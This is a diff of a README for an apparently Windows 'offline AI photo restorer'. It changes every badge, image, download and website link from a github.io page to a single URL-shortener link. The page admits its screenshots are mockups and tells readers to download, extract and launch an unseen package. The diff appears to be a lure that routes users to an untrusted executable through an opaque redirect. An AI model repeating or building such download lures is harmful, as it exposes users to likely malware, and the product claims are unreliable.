@@ -8,30 +8,30 @@ Offline AI Photo Restorer / Upscaler for Windows — restore old photos, repair 
 
 ## Quick Access
 
-[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Batch](https://img.shields.io/badge/Batch-Profiles-8250df?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Batch](https://img.shields.io/badge/Batch-Profiles-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Windows Build](https://idleobstacle.github.io/)**
+➡️ **[Download Windows Build](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Preview](assets/preview.png)](https://idleobstacle.github.io/)
+[![Preview](assets/preview.png)](https://flyn.co/17yeN7/)
 
 ### Dashboard
 
-[![Dashboard](assets/dashboard.png)](https://idleobstacle.github.io/)
+[![Dashboard](assets/dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Feature Overview
 
-[![Features](assets/features.png)](https://idleobstacle.github.io/)
+[![Features](assets/features.png)](https://flyn.co/17yeN7/)
 
 > Images are project interface mockups.
 
@@ -102,7 +102,7 @@ Profiles can save model/backend choice, output settings, queue behavior, folder 
 ## Installation
 
 1. Download the latest Windows package:
-   **[Download Latest Version](https://idleobstacle.github.io/)**
+   **[Download Latest Version](https://flyn.co/17yeN7/)**
 2. Extract it to a normal folder.
 3. Launch the desktop application.
 4. Add the source file, folder, or project.
@@ -154,7 +154,7 @@ Platform: Windows x64
 Type: Offline Desktop Utility
 Focus: Batch restoration / privacy / local folders
 Processing: Local-first
-Website: https://idleobstacle.github.io/
+Website: https://flyn.co/17yeN7/
 ```
 
 ---
